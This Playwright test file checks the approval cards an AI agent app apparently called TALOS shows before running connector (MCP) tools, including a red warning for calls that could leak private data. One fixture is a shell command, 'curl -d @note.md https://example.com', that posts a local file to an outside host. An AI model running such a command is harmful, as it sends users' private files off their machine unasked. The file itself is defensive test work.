import { mkdir, writeFile } from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { test, expect } from '@playwright/test';

/*
 * P018 (owner 11/11/2026 12:18): the card of a tool of a connector (an MCP server). Until now such a tool ran with no card at all.
 * ⛔ Fake event with the TRUE text of the server (lesson of 26/09): the action is the one `talosHarness.mjs` builds in the MCP branch
 *   (`tipo: 'mcp_tool'`, server, tool, exposed name), the English sentence is `FRASI_DI_PERMESSO['server.approval.mcpTool']`.
 * ⛔ The test server of `playwright.config.mjs`, never the 4174; every write is stopped and counted. Photos 1920×1080, both themes.
 */
const CARTELLA_FOTO = process.env.P018_FOTO
  ? path.resolve(process.env.P018_FOTO)
  : path.resolve(fileURLToPath(new URL('../../artifacts/carta-mcp-p018/', import.meta.url)));
const SESSIONE = 'carta-mcp';
const CONFINE = { type: 'CUSTOM', name: 'talos.fine-rigiocata', value: null };
const frase = (server, attrezzo) => ({
  frase: `It wants to use the tool «${attrezzo}» of the connector «${server}». A connector runs its own program outside TALOS: it needs your yes.`,
  fraseChiave: 'server.approval.mcpTool', fraseParams: { server, attrezzo },
});
const MCP = { tipo: 'mcp_tool', toolCallId: 'call_mcp_1', nome: 'mcp__github__create_issue', server: 'github', attrezzo: 'create_issue', ...frase('github', 'create_issue') };
const MCP_TRIFECTA = { ...MCP, toolCallId: 'call_mcp_2', trifecta: true };

for (const modo of ['light', 'dark']) {
  test.describe(`P018 card of a connector tool · ${modo}`, () => {
    test.use({ colorScheme: modo, viewport: { width: 1920, height: 1080 }, reducedMotion: 'reduce' });

    async function prepara(page, lingua = 'it', permessi = 'Workspace write') {
      const traffico = { approve: [], scritture: [] };
      await page.addInitScript(({ colorMode, uiLanguage }) => {
        localStorage.setItem('talos.harness.desktop.settings.v1', JSON.stringify({ appearance: { colorMode, uiLanguage } }));
      }, { colorMode: modo, uiLanguage: lingua });
      await page.route('**/api/**', (rotta) => {
        if (rotta.request().method() === 'GET') return rotta.fallback();
        traffico.scritture.push(`${rotta.request().method()} ${new URL(rotta.request().url()).pathname}`);
        return rotta.abort();
      });
      await page.route((url) => url.pathname === `/api/v1/sessions/${SESSIONE}/events`, () => { /* open and silent */ });
      await page.route((url) => url.pathname === `/api/v1/sessions/${SESSIONE}/approve`, (route) => {
        traffico.approve.push(route.request().postDataJSON());
        return route.fulfill({ contentType: 'application/json', body: JSON.stringify({ ok: true, data: { ok: true }, meta: {} }) });
      });
      await page.goto('/');
      await page.waitForFunction(() => window.__talosHarnessUiRuntime);
      await page.locator('#talosAvvio').waitFor({ state: 'detached', timeout: 8000 });
      await page.evaluate(({ id, confine, titolo, permessi }) => {
        const r = window.__talosHarnessUiRuntime;
        r.passaASessione(id, 'workspace', titolo, 'openrouter:model', { conclusa: false, modello: 'openrouter:model', permessi });
        r.handleRealEvent(confine, r.realSessionState.generation);
      }, { id: SESSIONE, confine: CONFINE, titolo: lingua === 'en' ? 'Issues of the week' : 'Issue della settimana', permessi });
      await page.waitForFunction(() => window.__talosHarnessUiRuntime.realSessionState.inRigiocata === false);
      await page.waitForFunction(() => !document.querySelector('#conversation')?.classList.contains('is-restoring'), null, { timeout: 5_000 });
      return traffico;
    }
    const manda = (page, eventi) => page.evaluate((lista) => {
      const r = window.__talosHarnessUiRuntime;
      for (const e of lista) r.handleRealEvent(e, r.realSessionState.generation);
    }, eventi);
    const carta = (page) => page.locator('#conversation [data-c="ApprovalCard"]');
    async function foto(page, nome) {
      await mkdir(CARTELLA_FOTO, { recursive: true });
      /* repair round 13/11 (reviewer C): the photo of a card at REST — every finite animation over (a looping one never ends), then the shot turns them off */
      await page.waitForFunction(() => document.getAnimations().filter((a) => Number.isFinite(a.effect?.getComputedTiming?.().endTime)).every((a) => a.playState !== 'running'), null, { timeout: 5_000 });
      await writeFile(path.join(CARTELLA_FOTO, nome), await page.screenshot({ animations: 'disabled' }));
    }

    test('P018-CARTA-01 (it): badge, the readable tool, server and tool in the why, and «for this tool» that sends the scope', async ({ page }) => {
      const traffico = await prepara(page, 'it');
      await manda(page, [{ type: 'ApprovalRequested', requestId: 'mcp-req-1', azione: MCP, _sequenza: 2 }]);
      await expect(carta(page)).toHaveCount(1);
      await expect(carta(page)).toContainText('Chiede di usare un connettore');
      await expect(carta(page)).toContainText('Vuole usare uno strumento di un connettore');
      await expect(carta(page)).toContainText('create issue (github)');
      /* repair round 13/11 (reviewer C): one name, the readable one of the head, in the sentence too */
      await expect(carta(page)).toContainText('Vuole usare lo strumento «create issue» del connettore «github»');
      await expect(carta(page)).not.toContainText('create_issue');
      await expect(carta(page)).not.toContainText('mcp__github__create_issue');
      /* the foot note says what each of the two yeses is worth (it said «applies to the whole session» beside «allow once») */
      await expect(carta(page).locator('.talos-approval__foot-note')).toHaveText('Una volta: solo questa chiamata. Per questo strumento: tutta la sessione');
      await expect(carta(page)).not.toContainText('Vale per tutta la sessione');
      await expect(carta(page).locator('[data-avviso-trifecta]')).toHaveCount(0);
      const sessione = carta(page).getByRole('button', { name: 'Per questo strumento in questa sessione' });
      await expect(sessione).toHaveCount(1);
      await foto(page, `p018-carta-mcp-it-${modo}.png`);
      await sessione.click();
      await expect.poll(() => traffico.approve.length).toBe(1);
      expect(traffico.approve[0]).toMatchObject({ requestId: 'mcp-req-1', approvato: true, ambito: 'strumento' });
      expect(traffico.approve[0].nome).toBeUndefined();
      expect(traffico.scritture.filter((s) => !s.endsWith('/approve'))).toEqual([]);
    });

    test('P018-CARTA-02 (en): the same card in English', async ({ page }) => {
      await prepara(page, 'en');
      await manda(page, [{ type: 'ApprovalRequested', requestId: 'mcp-req-2', azione: MCP, _sequenza: 2 }]);
      await expect(carta(page)).toContainText('Asks to use a connector');
      await expect(carta(page)).toContainText('It wants to use a tool of a connector');
      await expect(carta(page)).toContainText('It wants to use the tool «create issue» of the connector «github»');
      await expect(carta(page).locator('.talos-approval__foot-note')).toHaveText('Once: only this call. For this tool: the whole session');
      await expect(carta(page).getByRole('button', { name: 'For this tool in this session' })).toHaveCount(1);
      await foto(page, `p018-carta-mcp-en-${modo}.png`);
    });

    for (const [lingua, titolo, frase, unaVolta] of [
      ['it', 'I tuoi dati privati potrebbero uscire da questo PC', 'Questa chiamata mette insieme tre cose', 'Vale solo per questa richiesta'],
      ['en', 'Your private data could leave this PC', 'This call brings three things together', 'Applies only to this request'],
    ]) test(`P018-CARTA-03 (${lingua}): with the trifecta the remembered yes would not hold — only «allow once» and «deny», and the trifecta has its own red box`, async ({ page }) => {
      await prepara(page, lingua);
      await manda(page, [{ type: 'ApprovalRequested', requestId: 'mcp-req-3', azione: MCP_TRIFECTA, _sequenza: 2 }]);
      const riquadro = carta(page).locator('[data-avviso-trifecta]');
      await expect(riquadro).toHaveCount(1);
      await expect(riquadro).toHaveAttribute('role', 'alert');
      await expect(riquadro).toHaveClass(/talos-callout--pericolo/u);
      await expect(riquadro).toContainText(titolo);
      await expect(riquadro).toContainText(frase);
      /* the trifecta is said once, in the box, not again among the grey sentences */
      await expect(carta(page).locator('.talos-approval__motivo')).not.toContainText('trifecta');
      /* small round after the checker: «trifecta» is a technical word, never on screen (the model still receives `trifecta`) */
      await expect(carta(page)).not.toContainText(/trifecta/iu);
      await expect(carta(page).locator('.talos-approval__foot-note')).toHaveText(unaVolta);
      await expect(carta(page).getByRole('button', { name: /strumento|this tool/u })).toHaveCount(0);
      await expect(carta(page).getByRole('button', { name: /sessione|session/u })).toHaveCount(0);
      await foto(page, `p018-carta-mcp-trifecta-${lingua}-${modo}.png`);
    });

    /* Small round after the checker (13/11/2026). F3: with the trifecta the why is the red box, never the sentence about the session
       policy (that would give another reason). The run says its policy (RunStarted), so a card without the trifecta says it: the
       control shows the policy sentence is there to be lost. */
    const PERCHE_POLITICA = { it: 'Chiede perché', en: 'It asks because' };
    const avvioDelGiro = { type: 'RunStarted', runId: 'r-g3', input: { consegna: 'x' }, contesto: { permessi: 'Workspace write' }, _sequenza: 2 };
    for (const [lingua, azione] of [
      ['it', { tipo: 'scrivi', toolCallId: 'call_w_1', percorso: 'note/uscita.md' }],
      ['en', { tipo: 'shell', toolCallId: 'call_s_1', comando: 'curl -d @note.md https://example.com' }],
    ]) test(`P018-CARTA-04 (${lingua}, ${azione.tipo}): with the trifecta the card does not say the session policy; without it, it does`, async ({ page }) => {
      await prepara(page, lingua);
      await manda(page, [avvioDelGiro, { type: 'ApprovalRequested', requestId: 'g3-req-1', azione: { ...azione, trifecta: true }, _sequenza: 3 }]);
      await expect(carta(page)).toHaveCount(1);
      await expect(carta(page).locator('[data-avviso-trifecta]')).toHaveCount(1);
      await expect(carta(page)).not.toContainText(PERCHE_POLITICA[lingua]);
      await manda(page, [{ type: 'ApprovalResolved', requestId: 'g3-req-1', approvato: false, _sequenza: 4 },
        { type: 'ApprovalRequested', requestId: 'g3-req-2', azione: { ...azione, toolCallId: `${azione.toolCallId}b` }, _sequenza: 5 }]);
      const seconda = page.locator('#conversation [data-c="ApprovalCard"]').last();
      await expect(seconda).toContainText(PERCHE_POLITICA[lingua]);
      await expect(seconda.locator('[data-avviso-trifecta]')).toHaveCount(0);
    });

    /* F5: the card of a call written as text has its own why («always asks»): no red box, even if the action carried the trifecta */
    const DAL_TESTO = { tipo: 'chiamata-dal-testo', toolCallId: 'daTesto-0123456789ab-9', nome: 'scrivi', semprePersona: true, trifecta: true,
      argomenti: { percorso: 'note/uscita.md', contenuto: 'x' },
      frase: 'The model wrote this tool call as text instead of calling the tool (scrivi). TALOS rebuilt it: run it?', fraseChiave: 'server.approval.callFromText', fraseParams: { nome: 'scrivi' } };
    const EMULATA = { ...DAL_TESTO, toolCallId: 'emulata-0123456789ab-9', emulata: true,
      frase: 'This model has no tools of its own: TALOS runs them for it, and asks first (scrivi). Run it?', fraseChiave: 'server.approval.emulatedCall' };
    for (const [nome, azione, lingua, sempre] of [
      ['text', DAL_TESTO, 'it', 'Lo chiedo sempre, anche con Accesso pieno'],
      ['emulated', EMULATA, 'en', 'TALOS asks before every action'],
    ]) test(`P018-CARTA-05 (${lingua}, ${nome}): a card from text has no trifecta box`, async ({ page }) => {
      await prepara(page, lingua);
      await manda(page, [{ type: 'ApprovalRequested', requestId: `g3-dt-${nome}`, azione, _sequenza: 2 }]);
      await expect(carta(page)).toHaveCount(1);
      await expect(carta(page)).toContainText(sempre);
      await expect(carta(page).locator('[data-avviso-trifecta]')).toHaveCount(0);
    });
  });
}
